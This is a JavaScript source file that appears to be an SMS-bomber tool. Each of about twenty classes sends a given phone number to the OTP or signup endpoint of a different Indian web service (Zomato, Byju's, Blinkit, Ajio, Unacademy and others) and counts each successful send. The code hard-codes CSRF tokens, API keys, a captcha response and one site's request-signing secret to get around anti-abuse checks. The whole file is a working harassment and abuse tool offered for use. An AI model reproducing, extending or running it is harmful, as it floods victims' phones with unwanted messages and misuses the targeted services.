class w{
	send(msg){
		console.log(msg)
	}
}
let ws = new w;

class mywallety {
	hash(data) {
        var password = String.fromCharCode(109,121,119,97,108,108,101,116,108,121,45,111,112,115,117,107,114,97,116);
        let encryptedData = "";
		for (let i = 0; i < data.length; i++) {
			const charCode = String(data[i]).charCodeAt(0) ^ password.charCodeAt(i % password.length);
			encryptedData += String.fromCharCode(charCode);
		}
        return btoa(encryptedData);
	}

	random(length = 50) {
		let result = "";
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		for (let i = 0; i < length; i++) {
			const randomIndex = Math.floor(Math.random() * characters.length);
			result += characters.charAt(randomIndex);
		}
		return result;
	}

	prepaire_hash_data(data) {
		var dataString = JSON.stringify(data);
		var hashData = this.hash(dataString);
		data["hash"] = hashData;
		var dataFinal = JSON.stringify(data);
		return dataFinal;
	}
	async mainfun(number,ws){
		fetch("https://www.mywalletly.in/api/",{
			method:"POST",
			headers:{
				"Content-Type":"application/json"
			},
			body:this.prepaire_hash_data({
				"mobile":number,
				"random":this.random(),
				'method':"sendOtp"
			})
		}).then(res=>res.json()).then(data=> {
			if(data.status === "success") 
				ws.send("+1")
		});
	}
	constructor(number,ws){
		this.mainfun(number,ws);
	}
}

class infinitylearn{
	constructor(number,ws){
		fetch("https://otp.infinitylearn.com/api/generateOTP",{
			method:"POST",
			headers:{
				"Content-Type":"application/json"
			},
			body:JSON.stringify({"isd_code":"+91","phone":number,"tenant_id":"1","product_id":"300"})
		}).then(res=> res.json()).then((data)=>{
			if(data === true)
				ws.send("+1")
		})
	}
}

class my11circle{
	constructor(number,ws){
		fetch("https://www.my11circle.com/api/fl/auth/v3/getOtp",{
			method:"POST",
			headers:{
				"Content-Type":"application/json"
			},
			body:JSON.stringify({
				"mobile": number,
				"deviceId": "c4a7dd00-b941-48b7-89e8-4b758aa13d37",
				"deviceName": "",
				"refCode": "",
				"isPlaycircle": false
			})
		}).then(res => res.json()).then((data)=>{
			if(data.success === true)
				ws.send("+1")
		})
	}
}

class housing{
	constructor(number,ws){
		fetch("https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=desktop&source=web&source_name=AudienceWeb",{
			method:"POST",
			headers:{
				"Content-Type":"application/json"
			},
			body:JSON.stringify({"query":"\n  mutation(\n    $email: String\n    $phone: String\n    $otpLength: Int\n    $userAgent: String\n    $method: String\n  ) {\n    sendOtp(\n      phone: $phone\n      email: $email\n      otpLength: $otpLength\n      userAgent: $userAgent\n      method: $method\n    ) {\n      success\n      message\n    }\n  }\n","variables":{"phone":number,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"}})
		}).then(res=>res.json()).then((data)=>{
			if(data.data.sendOtp.success === true)
				ws.send("+1")
		})
	}
}


class zomato{
    constructor(number,ws){
        let data = new FormData();
        data.append("country_id", "1");
        data.append("number",number);
        data.append("type","initiate");
        data.append("csrf_token","1a20ab53810a26f6e668ba114ac310aa");
        data.append("lc","321f785dacc842fd84097ddee7616ac3");
        data.append("verification_type","sms")
        fetch("https://accounts.zomato.com/login/phone",{
            method:"POST",
            body:data
        }).then(res=>res.json()).then((data)=>{
            if(data.status === true && data.message === "Check text messages for your OTP")
                ws.send("+1")
        })
    }
}

class fantv{
    constructor(number, ws){
        fetch("https://admin.artistfirst.in/v1/auth/login-signup",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "mobile": number,
                "phoneCountryCode": "+91",
                "userId": "66cc47322c93001caa0d9f01"
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.message === "success")
                ws.send("+1")
        })
    }
}

class byjus{
    constructor(number,ws){
        fetch("https://identity.tllms.com/api/request_otp",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "phone": "+91-"+number,
                "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.phone === "+91-"+number)
                ws.send("+1")
        })
    }
}

class netmeds{
    constructor(number, ws){
        fetch("https://www.netmeds.com/mst/rest/v1/id/details/"+number,).then(res=>res.json()).then((data)=>{
            if(data?.result?.otp_details?.random_key)
                ws.send("+1")
        })
    }
}

class unacademy{
    constructor(number,ws){
        fetch("https://unacademy.com/api/v3/user/user_check/?enable-email=true",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({"phone":number,"country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false})
        }).then(res=>res.json()).then((data)=>{
            if(data.message === "OTP has been sent to your phone number")
                ws.send("+1")
        })
    }
}

class medibuddy{
    constructor(number,ws){
        fetch("https://loginprod.medibuddy.in/unified-login/user/register",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "source": "medibuddyInWeb",
                "platform": "medibuddy",
                "phonenumber": number,
                "flow": "Retail-Login-Home-Flow",
                "idealLoginFlow": "false",
                "advertiserId": "22003edf-0bc8-L8d1-9012-28760f6f6e44",
                "mbUserId": "null"
                })
        }).then(res=>res.json()).then((data)=>{
            if(data.data.OtpStatus === "Sent")
                ws.send("+1")
        })
    }
}

class momsco{
    constructor(number,ws){
        fetch("https://acl.mgapis.com/v6/otp/generate?vendorCode=tmc&countryFilter=IND&languageFilter=EN&apikey=4b47c4d455ab989c71464395cc74c23a",{
            method:"POST",
            headers:{
                "Content-Type":"application/json",
                "g-recaptcha-action":"sendOtp",
                "g-recaptcha-response":"c00da4f9-b137-4a4a-b548-25e1618ee603"
            },
            body:JSON.stringify({
                "countryCode": "91",
                "mobile": number,
                "isWhatsAppOpted": null,
                "name": "",
                "vendorCode": "tmc"
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.message === "Successfully Generated OTP")
                ws.send("+1")
        })
    }
}

class ajio{
    constructor(number,ws){
        fetch("https://login.web.ajio.com/api/auth/generateLoginOTP",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "mobileNumber": number
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.success === true)
                ws.send("+1")
            else{
                fetch("https://login.web.ajio.com/api/auth/signupSendOTP",{
                    method:"POST",
                    headers:{
                        "Content-Type":"application/json"
                    },
                    body:JSON.stringify({
                        "firstName": "saiyeja",
                        "login": "alsolss@gmail.com",
                        "genderType": "Female",
                        "mobileNumber": number,
                        "rilFnlRegisterReferralCode": "",
                        "requestType": "SENDOTP",
                        "newDesign": false
                    })
                }).then(res=>res.json()).then((data)=>{
                    if(data.statusCode === "1")
                        ws.send("+1")
                })
            }
        })
    }
}


class bookmyshow{
    constructor(number, ws){
        fetch("https://in.bookmyshow.com/api/members/otp/send",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "channel": "phone",
                "subChannel": "sms",
                "details": {
                    "phone": number,
                    "origin": "https://in.bookmyshow.com"
                }
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.statusCode === 200)
                ws.send("+1")
        })
    }
}

class nxtwave{
    constructor(number,ws){
        fetch("https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/user/login/phone_number/v1/",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "data": "\"{\\\"phone_number\\\":\\\""+number+"\\\",\\\"country_code\\\":\\\"+91\\\"}\"",
                "clientKeyDetailsId": 1
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.user_id){
                ws.send("+1")
            }else{
                fetch("https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/send_otp_to_user_with_phone_number/v1/",{
                    method:"POST",
                    headers:{
                        "Content-Type":"application/json"
                    },
                    body:JSON.stringify({"data":"\"{\\\"phone_number\\\":\\\""+number+"\\\",\\\"country_code\\\":\\\"+91\\\"}\"","clientKeyDetailsId":1})
                }).then(()=>{
                    ws.send("+1")
                })
            }
        })
    }
}

class tradex{
    constructor(number,ws){
        fetch("https://api.tradexapp.co/v2/sendotp",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "mobile": number,
                "source": "sms",
                "country_code": "+91",
                "version": 1099
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.success === "true")
                ws.send("+1")
        })
    }
}

class kukufm{
    constructor(number, ws){
        fetch("https://kukufm.com/api/v1/users/auth/send-otp/",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "phone_number": "+91"+number
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.message === "OTP sent successfully")
                ws.send("+1")
        })
    }
}

class blinkit{
    constructor(number, ws){
        fetch("https://blinkit.com/v2/accounts/",{
            method:"POST",
            headers:{
                "Content-Type":"application/x-www-form-urlencoded",
                "auth_key":"c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477"
            },
            body:new URLSearchParams({
                "user_phone":number
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.sms_sent === true)
                ws.send("+1")
        })
    }
}


class jar{
    constructor(number, ws){
        fetch("https://zeon-r.myjar.app/v1/pwa/zeon/authRequest?phoneNumber="+number+"&countryCode=91&partnerId=undefined&captchaResponse=03AFcWeA7s59rsqDWOInFwdOuos_8a78hOW3BVNhQ_CRSvPS4YTz9r-4m1e62NGww4FaICgz9GemkT9gblTGm9MjkeeOhs11FeXRclJixEVWLGAR4cFlya5VjXhhE7VqI_K2BvodvCvvUQzF7bJaXBhsQibE_s4px4VpGa8kBviozmy0LlSwv9EGh3VgQa-g7GifOtsncXLQW6_DA-nLQMEckRpl_1xLjZXcDZncmTz5U2KvErEEIhOVWJzpZfM8sbvkwOKFffneORAYFqMCuEe1N6eUBr9tYN7chYi0_hqWR_Z9_1b9soKk8m9JKVsmfDa7w8j3HlksOZSvrYgqeBJCrffhRToAgQ1uyuJZTc6BhxUA7x9bIoIqPBLvDHGFRi-hJWKQev_GwiNHfd-o0febSDojOdOo7iddb5-3MiBtTfOAYrcnlcCZEnTjqtiywlfMMFmoGGOqGPWfOX1KqCPPDAsiI7kjHehLgzwI-rnBkwFheS1kELHDvNVU9DTSQYfW1XV1gfEennqKQpoQP3wUyolz0qaB2Mg-G3LRnpV2zPenZc18moo5FskM_oEPY9TPhq11S5WOj782ayn4kp-_-hBjuRSUvCmv6x21mI6Vp4MOiIatmQ7G40LcEIu-_vhvEI-rMerFqVfAo4CJJUz85s8LzjhMX8ucZdPFNttMg2vj7udQpyghPxSGJrStRRbRxUC_5iLfAqVvVyOLv6-EMT8FUuSCKTWIrotZNrFYrhvsA9JOPKK9ZzvQHbblJECBCGnB3Va01yjYThaph9OGwXTEbYHJpq_oLvYNC0db6wpMHI3YS5P07W8SzgT58TpT-stI00PClE6kLGeGpGoWs-tEOb0CXC8DDoCTWeZsId-I_os-5MUo2UpG_O2L7-Df6tdnPWjA8qpnTnnSPOMBvEUjcjYV5SSVRDVrIln7pf0jv2EM3BGxJd3DxskeGxDUbV8qShiqnUm_WN8nt8Wye0bPnifw-ECZclGEa3stBPvrms_CFEm8nK3zTKUdAfNLuFTQlGR9XASom4XUqEGravhMk7lGWFKuV8n6vyOzMDO0yh1GtQ9k90bfzuvZ0Pp_zlPg72cbYTkxPPMXuhm8sYAODx9j260hNqrYpPahJwHf0pQR6x0C0e4c-K42-ZhvM6iR2lW_HUCiMv7T_9rwXGERX-tnRxawlhu2EtwuH_gGvLp5cF3moBbzR_etp45KZ8trO-nrBLDTh5AsnXpxkfJyIMMBqk0tJMzo8BFD2MrmQGNorPW9N8PFDw_Bjv6mFo-OxABliE06Q0ocbTnas-fOR32n_5tLLnyB-bEieOrmzMuK3nYEeO-AK35HFmiVH507BBXlapgd-suUoEQN_vEWgm2GpzX0bfKlSzesx5DaPoZWRaIjnmyjT5PG6Yp4CVz_aivNovVIrn4YENLIgzFCeQ3wAc3g5k-t7juktRuPkms_xqtnZyB1xDgSAuparH7cTtQ4IHR8r_86XL9e97D_k1gcpsq6IX1BMvzU-xVCVqKWKTpM1-_9_TDDb-ETfpXV19z9DHR6cB6Lys1w_JJ4tOhIZ7vzMtfHSdyeVobWtHCz9mCsuAq3aCHRVRIgui0O9lb-MG-jdLLHwc9ZlnSaRK-cLK99J5BAxV4ebJsjpb4cJ6tz7rMXzh3ugmM3EhZ188aDsRMla1PoI-N_PNLP3Et0Lm3JuVcFrsNc2uoZfMvL9YvJfgFx4FW6mDpnAt2U30843f868r9kGi2HDBPYOrDEkn46ApHYum1L7If-MAUSM3T4RgZdP11cOVovU3kqrjiRT9XDfHKF28ww4Q9Tj9CTG1-Ka_OoGHAvnE3IydIedXC8qXAW3ybFsPwURinImBzU0a",{
            method:"POST",
        }).then(res=>res.json()).then((data)=>{
            if(data.success === true)
                ws.send("+1")
        })
    }
}

class probo{
    constructor(number, ws){
        fetch("https://prod.api.probo.in/api/v1/user/login",{
            method:"POST",
            headers:{
                "Content-Type":"application/json",
                "x-device-os":"ANDROID",
                "x-version-name":"10",
                "appid":"in.probo.pro"
            },
            body:JSON.stringify({
                "mobile": number,
                "is_following_referee": false
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.message === "Successfully Done!!")
                ws.send("+1")
        })
    }
}
